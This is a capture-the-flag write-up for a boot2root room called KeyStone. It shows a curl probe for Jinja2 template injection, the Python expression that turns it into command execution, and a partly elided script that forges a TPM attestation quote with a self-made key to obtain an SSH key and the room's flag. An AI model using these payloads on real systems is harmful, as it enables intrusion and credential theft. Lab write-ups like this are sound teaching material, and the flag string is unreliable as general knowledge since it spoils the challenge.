# KeyStone - User -- boot2root

**Tools:** nmap, curl, openssl (RSA/TPM blob crafting), ssh
**Scripts:** Original scripts recovered from the session scratchpad: `exploit.py`.
**Flag:** `isfcr{tr0st_but_v3rify_the_endors3ment}`

## Enumeration

Keystone portal on :80 (Flask/Jinja2), an internal vault on `127.0.0.1:9000` (only reachable from
the box itself), and a software TPM (`swtpm`) on `127.0.0.1:2321` with AK handle `0x81000001`.
`/review?doc=` reflected the requested doc name verbatim in its "no such document" error page.

## Analysis

Confirmed SSTI with:

    curl -s -G 'http://TARGET/review' --data-urlencode 'doc={{7*7}}'
    -> <div class='doc'><h2>no such document</h2><p>Requested: 49</p></div>

Escalated straight to RCE
(`self.__init__.__globals__.__builtins__.__import__('os').popen(...).read()`), no gadget chain
needed. Through that RCE, dumped the vault's Go source (`/opt/vault/main.go`) and found
**VAULT-114** exactly as the changelog advertised: `/verify` only checks (1) the signature against
whatever AK public key the client itself supplied at `/attest`, (2) nonce echo, and (3) a PCR
digest that is always zero in this software-TPM setup -- i.e. attestation never binds the client's
AK to a real hardware Endorsement Key via credential activation, so a self-generated keypair can
pose as a trusted TPM.

## Exploit

Built and pushed an exploit (through the RCE, base64-encoded to survive the AttackBox's paste
handling) implementing the forged attestation:

    import subprocess, struct, json, base64, urllib.request
    subprocess.run(['openssl','genrsa','-out','/tmp/ak.key','2048'], check=True)
    subprocess.run(['openssl','rsa','-in','/tmp/ak.key','-pubout','-out','/tmp/ak.pub'], check=True)
    pub_pem = open('/tmp/ak.pub').read()
    # POST ak_pub_pem to /attest -> get {session, nonce, expected_digest}
    # build a hand-crafted TPMS_ATTEST-shaped message:
    msg  = struct.pack('>I', 0xFF544347)   # TPM_GENERATED_VALUE
    msg += struct.pack('>H', 0x8018)       # TPM_ST_ATTEST_QUOTE
    msg += blob16(b'')                     # empty qualifiedSigner name
    msg += blob16(nonce)                   # extraData = server nonce
    msg += b'\x00'*17 + b'\x00'*8          # TPMS_CLOCK_INFO + firmwareVersion
    msg += struct.pack('>I', 0)             # pcrSelect.count = 0
    msg += blob16(expected_digest)          # pcrDigest (always the static all-zero digest)
    # sign msg with our OWN ak.key (openssl dgst -sha256 -sign), POST to /verify -> token
    # GET /secret?token=... -> SECRET: <payload>

The vault accepted the self-signed quote (because it never checked the AK was really resident in
hardware) and released a `tpm-admin` SSH private key, which signs us in as the user -- the privilege
escalation to root from there is covered in [`keystone-root`](../keystone-root).

## Verification

The user flag was submitted and marked Correct Answer on the room's answer page.
